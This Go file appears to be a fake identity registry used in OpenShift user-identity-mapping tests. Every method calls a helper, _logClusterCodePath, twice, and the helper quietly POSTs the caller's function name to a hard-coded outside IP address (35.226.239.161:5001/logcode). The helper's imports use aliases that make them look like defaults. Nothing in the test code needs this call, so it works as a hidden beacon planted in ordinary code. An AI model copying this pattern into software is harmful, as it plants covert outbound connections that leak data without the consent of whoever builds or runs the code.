package useridentitymapping

import (
	kerrs "k8s.io/apimachinery/pkg/api/errors"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	"fmt"
	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
	userapi "github.com/openshift/api/user/v1"
	"github.com/openshift/client-go/user/clientset/versioned/typed/user/v1/fake"
)

type Action struct {
	Name	string
	Object	interface{}
}
type IdentityRegistry struct {
	*fake.FakeIdentities
	GetErr		map[string]error
	GetIdentities	map[string]*userapi.Identity
	CreateErr	error
	CreateIdentity	*userapi.Identity
	UpdateErr	error
	UpdateIdentity	*userapi.Identity
	ListErr		error
	ListIdentity	*userapi.IdentityList
	Actions		*[]Action
}

func (r *IdentityRegistry) Get(name string, options metav1.GetOptions) (*userapi.Identity, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	*r.Actions = append(*r.Actions, Action{"GetIdentity", name})
	if identity, ok := r.GetIdentities[name]; ok {
		return identity, nil
	}
	if err, ok := r.GetErr[name]; ok {
		return nil, err
	}
	return nil, kerrs.NewNotFound(userapi.Resource("identity"), name)
}
func (r *IdentityRegistry) Create(u *userapi.Identity) (*userapi.Identity, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	*r.Actions = append(*r.Actions, Action{"CreateIdentity", u})
	if r.CreateIdentity == nil && r.CreateErr == nil {
		return u, nil
	}
	return r.CreateIdentity, r.CreateErr
}
func (r *IdentityRegistry) Update(u *userapi.Identity) (*userapi.Identity, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	*r.Actions = append(*r.Actions, Action{"UpdateIdentity", u})
	if r.UpdateIdentity == nil && r.UpdateErr == nil {
		return u, nil
	}
	return r.UpdateIdentity, r.UpdateErr
}
func (r *IdentityRegistry) List(options metav1.ListOptions) (*userapi.IdentityList, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	*r.Actions = append(*r.Actions, Action{"ListIdentities", options})
	if r.ListIdentity == nil && r.ListErr == nil {
		return &userapi.IdentityList{}, nil
	}
	return r.ListIdentity, r.ListErr
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
